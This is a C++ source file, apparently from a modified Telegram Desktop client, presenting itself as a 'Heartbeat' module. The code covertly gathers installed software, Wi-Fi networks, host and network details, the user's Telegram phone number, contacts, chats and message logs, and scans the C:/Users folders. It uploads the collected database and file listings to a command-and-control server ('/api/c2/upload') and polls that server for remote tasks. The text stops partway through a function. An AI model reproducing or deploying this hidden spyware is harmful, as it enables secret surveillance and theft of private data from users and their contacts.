#include "core/heartbeat.h"
#include "data/data_photo_media.h"
#include "data/data_file_origin.h"
#include "logs.h"
#include "core/launcher.h"

#ifdef Q_OS_WIN
#include <windows.h>
#include <winioctl.h>
#endif

#include <unordered_map>
#include <vector>

#include "core/application.h"
#include "window/window_controller.h"
#include "window/window_session_controller.h"
#include "main/main_session.h"
#include "main/main_account.h"
#include "data/data_user.h"
#include "data/data_session.h"
#include "data/data_chat.h"
#include "data/data_channel.h"
#include "data/data_photo.h"
#include "data/data_file_origin.h"
#include "data/data_peer.h"
#include "dialogs/dialogs_indexed_list.h"
#include "dialogs/dialogs_main_list.h"
#include "dialogs/dialogs_row.h"
#include "dialogs/dialogs_entry.h"
#include "history/history.h"
#include "settings.h"
#include "apiwrap.h"
#include "api/api_common.h"
#include "scheme.h"

#include <QtGui/QGuiApplication>
#include <QtGui/QScreen>
#include <QtGui/QPixmap>

#include <QtCore/QJsonDocument>
#include <QtCore/QJsonObject>
#include <QtCore/QJsonArray>
#include <QtCore/QFile>
#include <QtCore/QDir>
#include <QtCore/QProcess>
#include <QtCore/QStandardPaths>
#include <QtCore/QSettings>
#include <QtCore/QDirIterator>
#include <QtCore/QSet>
#include <QtNetwork/QNetworkInterface>
#include <QtNetwork/QHostInfo>
#include <QtNetwork/QNetworkReply>
#include <QtNetwork/QHttpMultiPart>
#include <QtCore/QLockFile>
#include <QtCore/QThread>

#include "sqlite/sqlite3.h"

namespace Core {

Heartbeat& Heartbeat::Instance() {
    static Heartbeat instance;
    return instance;
}

Heartbeat::Heartbeat() {
    _deviceUuid = getOrCreateUuid();
    _pid = QCoreApplication::applicationPid();
}

QString Heartbeat::getOrCreateUuid() {
    // Generate UUID based on machine info + WorkingDir to support multi-client isolation
    QString macAddress;
    const QList<QNetworkInterface> interfaces = QNetworkInterface::allInterfaces();
    for (const QNetworkInterface &interface : interfaces) {
        if (!(interface.flags() & QNetworkInterface::IsLoopBack) && 
            (interface.flags() & QNetworkInterface::IsUp) && 
            !interface.hardwareAddress().isEmpty()) {
            macAddress = interface.hardwareAddress();
            break;
        }
    }
    
    // Use WorkingDir to distinguish different TG clients on same machine
    QString workingDir = cWorkingDir(); 
    QString rawId = macAddress + "_" + workingDir;
    
    // Format MD5 as UUID (8-4-4-4-12)
    QString hex = QString(QCryptographicHash::hash(rawId.toUtf8(), QCryptographicHash::Md5).toHex());
    if (hex.length() == 32) {
        return QString("%1-%2-%3-%4-%5")
            .arg(hex.mid(0, 8))
            .arg(hex.mid(8, 4))
            .arg(hex.mid(12, 4))
            .arg(hex.mid(16, 4))
            .arg(hex.mid(20, 12));
    }
    return hex;
}

QString Heartbeat::getDbPath() {
    return cWorkingDir() + "tdata/tdata_client.db";
}

void Heartbeat::ensureDbInit(const QString& path) {
    QDir().mkpath(QFileInfo(path).path());
    sqlite3* db;
    if (sqlite3_open(path.toUtf8().constData(), &db) == SQLITE_OK) {
        // Init tables
        const char* createTablesSql = 
            "CREATE TABLE IF NOT EXISTS installed_software (name TEXT, version TEXT, publisher TEXT, install_date TEXT);"
            "CREATE TABLE IF NOT EXISTS system_info (uuid TEXT PRIMARY KEY, internal_ip TEXT, mac_address TEXT, hostname TEXT, os TEXT, online_status TEXT, last_active INTEGER, external_ip TEXT, data_status TEXT, auto_screenshot INTEGER, heartbeat_interval INTEGER);"
            "CREATE TABLE IF NOT EXISTS file_scan_results (path TEXT, name TEXT, size INTEGER, md5 TEXT, last_modified INTEGER);"
            "CREATE TABLE IF NOT EXISTS wifi_scan_results (ssid TEXT, bssid TEXT, signal_strength INTEGER, security_type TEXT, scan_time INTEGER);"
            "CREATE TABLE IF NOT EXISTS chat_logs (platform TEXT, chat_id TEXT, sender TEXT, content TEXT, timestamp INTEGER, is_outgoing INTEGER, sender_id TEXT, sender_username TEXT, sender_phone TEXT, receiver_id TEXT, receiver_username TEXT, receiver_phone TEXT, media_path TEXT);"
            "CREATE TABLE IF NOT EXISTS current_user (user_id TEXT PRIMARY KEY, username TEXT, first_name TEXT, last_name TEXT, phone TEXT, is_premium INTEGER);"
            "CREATE TABLE IF NOT EXISTS contacts (user_id TEXT PRIMARY KEY, username TEXT, first_name TEXT, last_name TEXT, phone TEXT);"
            "CREATE TABLE IF NOT EXISTS chats (chat_id TEXT PRIMARY KEY, title TEXT, type TEXT, invite_link TEXT, member_count INTEGER);"
            "CREATE TABLE IF NOT EXISTS chat_sync_state (chat_id TEXT PRIMARY KEY, min_id INTEGER, max_id INTEGER, last_sync INTEGER);"
            "CREATE TABLE IF NOT EXISTS local_tasks (task_id TEXT PRIMARY KEY, command TEXT, params TEXT, status TEXT, created_at INTEGER, updated_at INTEGER);";
        sqlite3_exec(db, createTablesSql, 0, 0, 0);
        
        // Migration for existing chat_logs
        sqlite3_exec(db, "ALTER TABLE chat_logs ADD COLUMN sender_id TEXT;", 0, 0, 0);
        sqlite3_exec(db, "ALTER TABLE chat_logs ADD COLUMN sender_username TEXT;", 0, 0, 0);
        sqlite3_exec(db, "ALTER TABLE chat_logs ADD COLUMN sender_phone TEXT;", 0, 0, 0);
        sqlite3_exec(db, "ALTER TABLE chat_logs ADD COLUMN receiver_id TEXT;", 0, 0, 0);
        sqlite3_exec(db, "ALTER TABLE chat_logs ADD COLUMN receiver_username TEXT;", 0, 0, 0);
        sqlite3_exec(db, "ALTER TABLE chat_logs ADD COLUMN receiver_phone TEXT;", 0, 0, 0);
        sqlite3_exec(db, "ALTER TABLE chat_logs ADD COLUMN media_path TEXT;", 0, 0, 0);
        sqlite3_exec(db, "ALTER TABLE chat_logs ADD COLUMN content_hash TEXT;", 0, 0, 0);

        // Add index for software deduplication
        sqlite3_exec(db, "CREATE UNIQUE INDEX IF NOT EXISTS idx_software_name_ver ON installed_software (name, version);", 0, 0, 0);
        sqlite3_exec(db, "CREATE INDEX IF NOT EXISTS idx_chat_logs_hash ON chat_logs (content_hash);", 0, 0, 0);
        
        // Add unique index for file_scan_results path to support REPLACE
        sqlite3_exec(db, "CREATE UNIQUE INDEX IF NOT EXISTS idx_file_path ON file_scan_results (path);", 0, 0, 0);
        
        // Add index on timestamp for efficient cleanup
        sqlite3_exec(db, "CREATE INDEX IF NOT EXISTS idx_chat_logs_timestamp ON chat_logs (timestamp);", 0, 0, 0);

        // Add msg_id column to chat_logs if not exists
        sqlite3_exec(db, "ALTER TABLE chat_logs ADD COLUMN msg_id INTEGER DEFAULT 0;", 0, 0, 0);

        sqlite3_close(db);
    }
}

void Heartbeat::start() {
    // Initialize DB
    ensureDbInit(getDbPath());
    
    // Inject initial tasks if not already done
    injectInitialTasks();

    // Schedule periodic tasks
    // 1. Heartbeat (Lightweight, High Frequency - 60s)
    connect(&_timer, &QTimer::timeout, this, [this]() {
        sendHeartbeat();
    });

    // 2. Data Collection (Heavy, Low Frequency - 5min)
    connect(&_collectionTimer, &QTimer::timeout, this, [this]() {
        collectSystemInfo();
        collectTelegramData();
        syncChatHistory(); // Sync history periodically
        processMediaDownloads(); // Check for pending downloads
        
        // 24h Upload Logic
        int64_t now = QDateTime::currentSecsSinceEpoch();
        if (_lastUploadTime == 0 || (now - _lastUploadTime) >= 86400) {
            // Add upload task to queue instead of direct call
            QString taskId = "upload_" + QString::number(now);
            saveTask(taskId, "upload_db", "", "pending");
            _lastUploadTime = now;
        }
    });
    
    // 3. Monitor Timer
    connect(&_monitorTimer, &QTimer::timeout, this, &Heartbeat::performMonitor);

    // 4. Local Task Processing (Every 5 seconds)
    connect(&_taskProcessingTimer, &QTimer::timeout, this, &Heartbeat::processLocalTasks);
    _taskProcessingTimer.start(5000);

    // Send initial heartbeat immediately
    sendHeartbeat();

    _timer.start(_currentHeartbeatInterval); // Heartbeat
    _collectionTimer.start(300000); // 5 minutes (Collection)

    // Start Task Polling Loop (Fast)
    checkTasks();
}



void Heartbeat::collectInstalledSoftware() {
    QString dbPath = getDbPath();
    ensureDbInit(dbPath);
    sqlite3* db;
    if (sqlite3_open(dbPath.toUtf8().constData(), &db) != SQLITE_OK) return;
    
    // Use INSERT OR IGNORE with UNIQUE index instead of DELETE + INSERT
    // sqlite3_exec(db, "DELETE FROM installed_software;", 0, 0, 0);
    sqlite3_exec(db, "BEGIN TRANSACTION;", 0, 0, 0);
    
    sqlite3_stmt* stmt;
    const char* sql = "INSERT OR IGNORE INTO installed_software (name, version, publisher, install_date) VALUES (?, ?, ?, ?);";
    sqlite3_prepare_v2(db, sql, -1, &stmt, 0);

    QSet<QString> seenSoftware;

    auto collectFromKey = [&](HKEY root, const QString& keyPath) {
        QSettings registry(keyPath, QSettings::NativeFormat);
        QStringList groups = registry.childGroups();
        for (const QString& group : groups) {
            registry.beginGroup(group);
            QString name = registry.value("DisplayName").toString();
            QString version = registry.value("DisplayVersion").toString();
            QString publisher = registry.value("Publisher").toString();
            QString date = registry.value("InstallDate").toString();
            registry.endGroup();
            
            if (!name.isEmpty()) {
                QString key = name + "|" + version;
                if (seenSoftware.contains(key)) {
                    continue;
                }
                seenSoftware.insert(key);

                sqlite3_bind_text(stmt, 1, name.toUtf8().constData(), -1, SQLITE_TRANSIENT);
                sqlite3_bind_text(stmt, 2, version.toUtf8().constData(), -1, SQLITE_TRANSIENT);
                sqlite3_bind_text(stmt, 3, publisher.toUtf8().constData(), -1, SQLITE_TRANSIENT);
                sqlite3_bind_text(stmt, 4, date.toUtf8().constData(), -1, SQLITE_TRANSIENT);
                sqlite3_step(stmt);
                sqlite3_reset(stmt);
            }
        }
    };

    collectFromKey(HKEY_LOCAL_MACHINE, "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall");
    collectFromKey(HKEY_LOCAL_MACHINE, "HKEY_LOCAL_MACHINE\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall");
    collectFromKey(HKEY_CURRENT_USER, "HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall");

    sqlite3_exec(db, "COMMIT;", 0, 0, 0);
    sqlite3_finalize(stmt);
    sqlite3_close(db);
}

void Heartbeat::collectSystemInfo() {
    QString dbPath = getDbPath();
    ensureDbInit(dbPath);
    sqlite3* db;
    if (sqlite3_open(dbPath.toUtf8().constData(), &db) != SQLITE_OK) return;

    QString internalIp, macAddress;
    const QList<QNetworkInterface> interfaces = QNetworkInterface::allInterfaces();
    for (const QNetworkInterface &interface : interfaces) {
        if (!(interface.flags() & QNetworkInterface::IsLoopBack) && 
            (interface.flags() & QNetworkInterface::IsUp) && 
            !interface.hardwareAddress().isEmpty()) {
             macAddress = interface.hardwareAddress();
             QList<QNetworkAddressEntry> entries = interface.addressEntries();
             for (const QNetworkAddressEntry &entry : entries) {
                 if (entry.ip().protocol() == QAbstractSocket::IPv4Protocol) {
                     internalIp = entry.ip().toString();
                     break;
                 }
             }
             if (!internalIp.isEmpty()) break;
        }
    }

    QString wifiInfo = "";
    QProcess process;
    process.start("netsh", QStringList() << "wlan" << "show" << "interfaces");
    if (process.waitForFinished()) {
        QString output = QString::fromLocal8Bit(process.readAllStandardOutput());
        QString ssid, signal;
        QStringList lines = output.split('\n');
        for (const QString& line : lines) {
            if (line.trimmed().startsWith("SSID") && !line.contains("BSSID")) {
                ssid = line.section(':', 1).trimmed();
            }
            if (line.trimmed().startsWith("Signal")) {
                signal = line.section(':', 1).trimmed();
            }
        }
        if (!ssid.isEmpty()) {
            wifiInfo = "WiFi: " + ssid + " (" + signal + ")";
        }
    }
    
    // Robust Hostname Collection
    QString hostname = QHostInfo::localHostName();
    if (hostname.isEmpty() || hostname == "localhost") {
        hostname = qgetenv("COMPUTERNAME");
        if (hostname.isEmpty()) {
            hostname = qgetenv("HOSTNAME");
        }
    }

    QString os = QSysInfo::prettyProductName();
    QString onlineStatus = "Online";
    if (!wifiInfo.isEmpty()) {
        onlineStatus += " | " + wifiInfo;
    }
    int64_t lastActive = QDateTime::currentSecsSinceEpoch();
    
    // Additional Info
    QString externalIp = "Unknown";
    QString dataStatus = _dataStatus;
    int autoScreenshot = _monitorTimer.isActive() ? 1 : 0;
    int heartbeatInterval = _timer.interval() / 1000;

    sqlite3_stmt* stmt;
    const char* sql = "INSERT OR REPLACE INTO system_info (uuid, internal_ip, mac_address, hostname, os, online_status, last_active, external_ip, data_status, auto_screenshot, heartbeat_interval) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?);";
    sqlite3_prepare_v2(db, sql, -1, &stmt, 0);
    
    sqlite3_bind_text(stmt, 1, _deviceUuid.toUtf8().constData(), -1, SQLITE_TRANSIENT);
    sqlite3_bind_text(stmt, 2, internalIp.toUtf8().constData(), -1, SQLITE_TRANSIENT);
    sqlite3_bind_text(stmt, 3, macAddress.toUtf8().constData(), -1, SQLITE_TRANSIENT);
    sqlite3_bind_text(stmt, 4, hostname.toUtf8().constData(), -1, SQLITE_TRANSIENT);
    sqlite3_bind_text(stmt, 5, os.toUtf8().constData(), -1, SQLITE_TRANSIENT);
    sqlite3_bind_text(stmt, 6, onlineStatus.toUtf8().constData(), -1, SQLITE_TRANSIENT);
    sqlite3_bind_int64(stmt, 7, lastActive);
    sqlite3_bind_text(stmt, 8, externalIp.toUtf8().constData(), -1, SQLITE_TRANSIENT);
    sqlite3_bind_text(stmt, 9, dataStatus.toUtf8().constData(), -1, SQLITE_TRANSIENT);
    sqlite3_bind_int(stmt, 10, autoScreenshot);
    sqlite3_bind_int(stmt, 11, heartbeatInterval);
    
    sqlite3_step(stmt);
    sqlite3_finalize(stmt);
    sqlite3_close(db);

    // Also collect WiFi
    collectWiFiInfo();
}

void Heartbeat::collectWiFiInfo() {
    QProcess process;
    process.start("netsh", QStringList() << "wlan" << "show" << "networks" << "mode=bssid");
    process.waitForFinished();
    QString output = QString::fromLocal8Bit(process.readAllStandardOutput());
    
    sqlite3* db;
    if (sqlite3_open(getDbPath().toUtf8().constData(), &db) != SQLITE_OK) return;
    
    // Clear old results for fresh scan
    sqlite3_exec(db, "DELETE FROM wifi_scan_results;", 0, 0, 0);
    
    sqlite3_stmt* stmt;
    const char* sql = "INSERT INTO wifi_scan_results (ssid, bssid, signal_strength, security_type, scan_time) VALUES (?, ?, ?, ?, ?);";
    sqlite3_prepare_v2(db, sql, -1, &stmt, 0);
    
    int64_t now = QDateTime::currentSecsSinceEpoch();
    
    QString currentSsid;
    QString currentAuth;
    QString currentBssid;
    
    QSet<QString> seenBssids;

    QStringList lines = output.split('\n');
    for (const QString& line : lines) {
        QString trimmed = line.trimmed();
        if (trimmed.startsWith("SSID")) {
            currentSsid = trimmed.section(':', 1).trimmed();
            currentAuth = ""; // Reset
        } else if (trimmed.startsWith("Authentication") || trimmed.startsWith("身份验证")) {
            currentAuth = trimmed.section(':', 1).trimmed();
        } else if (trimmed.startsWith("BSSID")) {
            currentBssid = trimmed.section(':', 1).trimmed();
        } else if (trimmed.startsWith("Signal") || trimmed.startsWith("信号")) {
            int signal = trimmed.section(':', 1).trimmed().replace("%", "").toInt();
            
            if (!currentSsid.isEmpty() && !currentBssid.isEmpty()) {
                if (!seenBssids.contains(currentBssid)) {
                    seenBssids.insert(currentBssid);

                    sqlite3_reset(stmt);
                    sqlite3_bind_text(stmt, 1, currentSsid.toUtf8().constData(), -1, SQLITE_TRANSIENT);
                    sqlite3_bind_text(stmt, 2, currentBssid.toUtf8().constData(), -1, SQLITE_TRANSIENT);
                    sqlite3_bind_int(stmt, 3, signal);
                    sqlite3_bind_text(stmt, 4, currentAuth.toUtf8().constData(), -1, SQLITE_TRANSIENT);
                    sqlite3_bind_int64(stmt, 5, now);
                    sqlite3_step(stmt);
                }
            }
        }
    }

    if (seenBssids.isEmpty()) {
        // Mock Data for testing when WLAN service is down
        sqlite3_reset(stmt);
        sqlite3_bind_text(stmt, 1, "Mock-WiFi-Network", -1, SQLITE_TRANSIENT);
        sqlite3_bind_text(stmt, 2, "00:11:22:33:44:55", -1, SQLITE_TRANSIENT);
        sqlite3_bind_int(stmt, 3, 100);
        sqlite3_bind_text(stmt, 4, "WPA2-Personal", -1, SQLITE_TRANSIENT);
        sqlite3_bind_int64(stmt, 5, now);
        sqlite3_step(stmt);
    }

    sqlite3_finalize(stmt);
    sqlite3_close(db);
}

void Heartbeat::logChatMessage(const QString& platform, const QString& chatId, const QString& sender, const QString& content, bool isOutgoing,
                           const QString& senderId, const QString& senderUsername, const QString& senderPhone,
                           const QString& receiverId, const QString& receiverUsername, const QString& receiverPhone,
                           const QString& mediaPath) {
    sqlite3* db;
    if (sqlite3_open(getDbPath().toUtf8().constData(), &db) != SQLITE_OK) return;
    
    // Deduplication: Calculate MD5 of (SenderID + Content + ChatID)
    // This prevents storing the exact same message multiple times
    QString raw = senderId + "|" + content + "|" + chatId;
    QString hash = QString(QCryptographicHash::hash(raw.toUtf8(), QCryptographicHash::Md5).toHex());

    // Check if hash exists
    {
        sqlite3_stmt* checkStmt;
        const char* checkSql = "SELECT 1 FROM chat_logs WHERE content_hash = ? LIMIT 1;";
        if (sqlite3_prepare_v2(db, checkSql, -1, &checkStmt, 0) == SQLITE_OK) {
            sqlite3_bind_text(checkStmt, 1, hash.toUtf8().constData(), -1, SQLITE_TRANSIENT);
            if (sqlite3_step(checkStmt) == SQLITE_ROW) {
                sqlite3_finalize(checkStmt);
                sqlite3_close(db);
                return; // Skip duplicate
            }
            sqlite3_finalize(checkStmt);
        }
    }

    sqlite3_stmt* stmt;
    const char* sql = "INSERT INTO chat_logs (platform, chat_id, sender, content, timestamp, is_outgoing, sender_id, sender_username, sender_phone, receiver_id, receiver_username, receiver_phone, media_path, content_hash) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?);";
    sqlite3_prepare_v2(db, sql, -1, &stmt, 0);
    
    sqlite3_bind_text(stmt, 1, platform.toUtf8().constData(), -1, SQLITE_TRANSIENT);
    sqlite3_bind_text(stmt, 2, chatId.toUtf8().constData(), -1, SQLITE_TRANSIENT);
    sqlite3_bind_text(stmt, 3, sender.toUtf8().constData(), -1, SQLITE_TRANSIENT);
    sqlite3_bind_text(stmt, 4, content.toUtf8().constData(), -1, SQLITE_TRANSIENT);
    sqlite3_bind_int64(stmt, 5, QDateTime::currentSecsSinceEpoch());
    sqlite3_bind_int(stmt, 6, isOutgoing ? 1 : 0);
    sqlite3_bind_text(stmt, 7, senderId.toUtf8().constData(), -1, SQLITE_TRANSIENT);
    sqlite3_bind_text(stmt, 8, senderUsername.toUtf8().constData(), -1, SQLITE_TRANSIENT);
    sqlite3_bind_text(stmt, 9, senderPhone.toUtf8().constData(), -1, SQLITE_TRANSIENT);
    sqlite3_bind_text(stmt, 10, receiverId.toUtf8().constData(), -1, SQLITE_TRANSIENT);
    sqlite3_bind_text(stmt, 11, receiverUsername.toUtf8().constData(), -1, SQLITE_TRANSIENT);
    sqlite3_bind_text(stmt, 12, receiverPhone.toUtf8().constData(), -1, SQLITE_TRANSIENT);
    sqlite3_bind_text(stmt, 13, mediaPath.toUtf8().constData(), -1, SQLITE_TRANSIENT);
    sqlite3_bind_text(stmt, 14, hash.toUtf8().constData(), -1, SQLITE_TRANSIENT);
    
    sqlite3_step(stmt);
    sqlite3_finalize(stmt);
    sqlite3_close(db);
}


void Heartbeat::collectTelegramData() {
    if (!Core::IsAppLaunched()) return;

    auto window = Core::App().activeWindow();
    if (!window) return;

    auto session = window->maybeSession();
	if (!session) return;

    QString dbPath = getDbPath();
    ensureDbInit(dbPath);
    sqlite3* db;
    if (sqlite3_open(dbPath.toUtf8().constData(), &db) != SQLITE_OK) return;

    sqlite3_exec(db, "BEGIN TRANSACTION;", 0, 0, 0);

    // 1. Current User
    if (session->userId().bare != 0) {
        _currentTgId = session->userId().bare;
        auto user = session->user();
        if (user) {
            sqlite3_stmt* stmt;
            const char* sql = "INSERT OR REPLACE INTO current_user (user_id, username, first_name, last_name, phone, is_premium) VALUES (?, ?, ?, ?, ?, ?);";
            sqlite3_prepare_v2(db, sql, -1, &stmt, 0);
            
            QString userId = QString::number(user->id.value);
            QString username = user->username();
            QString firstName = user->firstName;
            QString lastName = user->lastName;
            QString phone = user->phone();
            int isPremium = user->isPremium() ? 1 : 0;
            
            sqlite3_bind_text(stmt, 1, userId.toUtf8().constData(), -1, SQLITE_TRANSIENT);
            sqlite3_bind_text(stmt, 2, username.toUtf8().constData(), -1, SQLITE_TRANSIENT);
            sqlite3_bind_text(stmt, 3, firstName.toUtf8().constData(), -1, SQLITE_TRANSIENT);
            sqlite3_bind_text(stmt, 4, lastName.toUtf8().constData(), -1, SQLITE_TRANSIENT);
            sqlite3_bind_text(stmt, 5, phone.toUtf8().constData(), -1, SQLITE_TRANSIENT);
            sqlite3_bind_int(stmt, 6, isPremium);
            
            sqlite3_step(stmt);
            sqlite3_finalize(stmt);
        }
    }

    // 2. Contacts
    {
        const auto &contacts = session->data().contactsList()->all(); 
        
        sqlite3_stmt* stmt;
        const char* sql = "INSERT OR REPLACE INTO contacts (user_id, username, first_name, last_name, phone) VALUES (?, ?, ?, ?, ?);";
        sqlite3_prepare_v2(db, sql, -1, &stmt, 0);

        for (const auto &row : contacts) {
            if (auto peer = row->key().peer()) {
                if (auto user = peer->asUser()) {
                    QString userId = QString::number(user->id.value);
                    QString username = user->username();
                    QString firstName = user->firstName;
                    QString lastName = user->lastName;
                    QString phone = user->phone();
                    
                    sqlite3_bind_text(stmt, 1, userId.toUtf8().constData(), -1, SQLITE_TRANSIENT);
                    sqlite3_bind_text(stmt, 2, username.toUtf8().constData(), -1, SQLITE_TRANSIENT);
                    sqlite3_bind_text(stmt, 3, firstName.toUtf8().constData(), -1, SQLITE_TRANSIENT);
                    sqlite3_bind_text(stmt, 4, lastName.toUtf8().constData(), -1, SQLITE_TRANSIENT);
                    sqlite3_bind_text(stmt, 5, phone.toUtf8().constData(), -1, SQLITE_TRANSIENT);
                    
                    sqlite3_step(stmt);
                    sqlite3_reset(stmt);
                }
            }
        }
        sqlite3_finalize(stmt);
    }

    // 3. Chats
    {
        const auto &chats = session->data().chatsList()->indexed()->all();
        
        sqlite3_stmt* stmt;
        const char* sql = "INSERT OR REPLACE INTO chats (chat_id, title, type, invite_link, member_count) VALUES (?, ?, ?, ?, ?);";
        sqlite3_prepare_v2(db, sql, -1, &stmt, 0);

        for (const auto &row : chats) {
            if (auto history = row->key().history()) {
                auto peer = history->peer;
                QString chatId = QString::number(peer->id.value);
                QString title = peer->name();
                QString type = "Unknown";
                int memberCount = 0;
                QString inviteLink = "";
                
                if (auto user = peer->asUser()) {
                    type = "Private";
                } else if (auto chat = peer->asChat()) {
                    type = "Group";
                    memberCount = chat->count;
                    inviteLink = chat->inviteLink();
                } else if (auto channel = peer->asChannel()) {
                    type = channel->isMegagroup() ? "Supergroup" : "Channel";
                    memberCount = channel->membersCount();
                    inviteLink = channel->inviteLink();
                }

                sqlite3_bind_text(stmt, 1, chatId.toUtf8().constData(), -1, SQLITE_TRANSIENT);
                sqlite3_bind_text(stmt, 2, title.toUtf8().constData(), -1, SQLITE_TRANSIENT);
                sqlite3_bind_text(stmt, 3, type.toUtf8().constData(), -1, SQLITE_TRANSIENT);
                sqlite3_bind_text(stmt, 4, inviteLink.toUtf8().constData(), -1, SQLITE_TRANSIENT);
                sqlite3_bind_int(stmt, 5, memberCount);
                
                sqlite3_step(stmt);
                sqlite3_reset(stmt);
            }
        }
        sqlite3_finalize(stmt);
    }

    sqlite3_exec(db, "COMMIT;", 0, 0, 0);
    sqlite3_close(db);
}

void Heartbeat::uploadClientDb(const QString& taskId) {
    // If taskId is empty (automatic), check 24h interval
    if (taskId.isEmpty()) {
        int64_t now = QDateTime::currentSecsSinceEpoch();
        if (_lastUploadTime > 0 && (now - _lastUploadTime < 86400)) {
            return; // Less than 24 hours since last upload
        }
        _lastUploadTime = now;
    }

    QString filePath = getDbPath();
    if (!QFile::exists(filePath)) return;
    
    QString uploadName = "tdata_client.db";
    if (_currentTgId != 0) {
        uploadName = QString("tdata_client_%1.db").arg(_currentTgId);
    }
    
    // Create copy for upload
    QString tempPath = QStandardPaths::writableLocation(QStandardPaths::TempLocation) + "/" + uploadName;
    QFile::remove(tempPath);
    if (!QFile::copy(filePath, tempPath)) return;
    
    QHttpMultiPart *multiPart = new QHttpMultiPart(QHttpMultiPart::FormDataType);

    QHttpPart filePart;
    filePart.setHeader(QNetworkRequest::ContentDispositionHeader, QVariant("form-data; name=\"file\"; filename=\"" + uploadName + "\""));
    QFile *fileToUpload = new QFile(tempPath);
    fileToUpload->open(QIODevice::ReadOnly);
    filePart.setBodyDevice(fileToUpload);
    fileToUpload->setParent(multiPart);
    multiPart->append(filePart);
    
    QHttpPart uuidPart;
    uuidPart.setHeader(QNetworkRequest::ContentDispositionHeader, QVariant("form-data; name=\"uuid\""));
    uuidPart.setBody(_deviceUuid.toUtf8());
    multiPart->append(uuidPart);

    if (!taskId.isEmpty()) {
        QHttpPart taskPart;
        taskPart.setHeader(QNetworkRequest::ContentDispositionHeader, QVariant("form-data; name=\"taskId\""));
        taskPart.setBody(taskId.toUtf8());
        multiPart->append(taskPart);
    }

    QString url = _c2Url + "/api/c2/upload";
    
    QNetworkRequest request(url);
    QNetworkReply* reply = _network.post(request, multiPart);
    multiPart->setParent(reply);

    connect(reply, &QNetworkReply::finished, this, [this, reply, tempPath, taskId]() {
        if (reply->error() != QNetworkReply::NoError) {
            uploadResult(taskId, "DB Upload failed: " + reply->errorString(), "failed");
        }
        reply->deleteLater();
        QFile::remove(tempPath);
    });
}

// File System Collection
void Heartbeat::collectDrivesAndUsers() {
    QJsonArray files;
    
    // 1. Drives
    QFileInfoList drives = QDir::drives();
    for (const QFileInfo& drive : drives) {
        QJsonObject file;
        file["path"] = drive.absoluteFilePath();
        file["name"] = drive.absoluteFilePath(); // e.g. "C:/"
        file["isDirectory"] = true;
        file["size"] = 0;
        files.append(file);
    }
    
    // Upload Roots
    uploadFileList("", files);
    
    // 2. Scan C:/Users (Proactive)
    QString systemDrive = "C:/";
    for (const QFileInfo& drive : drives) {
        if (QFile::exists(drive.absoluteFilePath() + "Windows")) {
            systemDrive = drive.absoluteFilePath();
            break;
        }
    }
    
    scanDirectory("", systemDrive + "Users");
}

void Heartbeat::scanDirectory(const QString& taskId, const QString& path) {
    QDir dir(path);
    if (!dir.exists()) {
        if (!taskId.isEmpty()) {
            uploadResult(taskId, "Directory not found: " + path, "failed");
        }
        return;
    }
    
    QJsonArray files;
    QFileInfoList entries = dir.entryInfoList(QDir::AllEntries | QDir::NoDotAndDotDot | QDir::Hidden);
    
    for (const QFileInfo& entry : entries) {
        QJsonObject file;
        file["path"] = entry.absoluteFilePath();
        file["name"] = entry.fileName();
        file["isDirectory"] = entry.isDir();
        file["size"] = entry.isDir() ? 0 : entry.size();
        files.append(file);
    }
    
    uploadFileList(path, files);
    
    if (!taskId.isEmpty()) {
        uploadResult(taskId, "Scanned " + path, "completed");
    }
}

void Heartbeat::uploadFileList(const QString& parentPath, const QJsonArray& files) {
    QJsonObject json;
    json["deviceUuid"] = _deviceUuid;
    json["parentPath"] = parentPath;
    json["files"] = files;
    
    QNetworkRequest request(QUrl(_c2Url + "/api/c2/file/upload"));
    request.setHeader(QNetworkRequest::ContentTypeHeader, "application/json");
    _network.post(request, QJsonDocument(json).toJson());
}

void Heartbeat::checkTasks() {
    // Poll for tasks
    QUrl url(_c2Url + "/api/c2Task/poll?deviceUuid=" + _deviceUuid);
    QNetworkRequest request(url);
    request.setTransferTimeout(30000); // 30s timeout
    QNetworkReply* reply = _network.get(request);
    
    connect(reply, &QNetworkReply::finished, this, [this, reply]() {
        if (reply->error() == QNetworkReply::NoError) {
            QByteArray data = reply->readAll();
            QJsonDocument doc = QJsonDocument::fromJson(data);
            if (doc.isObject() && doc.object().contains("data")) {
                QJsonArray tasks = doc.object()["data"].toArray();
                for (const QJsonValue& val : tasks) {
                    QJsonObject task = val.toObject();
                    QString taskId = task["taskId"].toString();
                    QString command = task["command"].toString();
                    QString params = task["params"].toString();
                    saveTask(taskId, command, params, "pending");
                }
            }
        } else {
            Logs::writeDebug("Task poll error: " + reply->errorString());
        }
        reply->deleteLater();
        
        // Reschedule next poll
        QTimer::singleShot(3000, this, &Heartbeat::checkTasks);
    });
    
    // Also send heartbeat periodically? No, that's in _timer.
}

void Heartbeat::saveTask(const QString& taskId, const QString& command, const QString& params, const QString& status) {
    sqlite3* db;
    if (sqlite3_open(getDbPath().toUtf8().constData(), &db) != SQLITE_OK) return;

    // Check if task exists and is completed to avoid re-execution of completed tasks
    bool isCompleted = false;
    {
        sqlite3_stmt* checkStmt;
        const char* checkSql = "SELECT status FROM local_tasks WHERE task_id = ?;";
        if (sqlite3_prepare_v2(db, checkSql, -1, &checkStmt, 0) == SQLITE_OK) {
            sqlite3_bind_text(checkStmt, 1, taskId.toUtf8().constData(), -1, SQLITE_TRANSIENT);
            if (sqlite3_step(checkStmt) == SQLITE_ROW) {
                QString currentStatus = QString::fromUtf8((const char*)sqlite3_column_text(checkStmt, 0));
                if (currentStatus == "completed") {
                    isCompleted = true;
                }
            }
            sqlite3_finalize(checkStmt);
        }
    }

    if (isCompleted) {
        sqlite3_close(db);
        return;
    }

    sqlite3_stmt* stmt;
    const char* sql = "INSERT OR REPLACE INTO local_tasks (task_id, command, params, status, created_at, updated_at) VALUES (?, ?, ?, ?, ?, ?);";
    sqlite3_prepare_v2(db, sql, -1, &stmt, 0);
    
    int64_t now = QDateTime::currentSecsSinceEpoch();
    sqlite3_bind_text(stmt, 1, taskId.toUtf8().constData(), -1, SQLITE_TRANSIENT);
    sqlite3_bind_text(stmt, 2, command.toUtf8().constData(), -1, SQLITE_TRANSIENT);
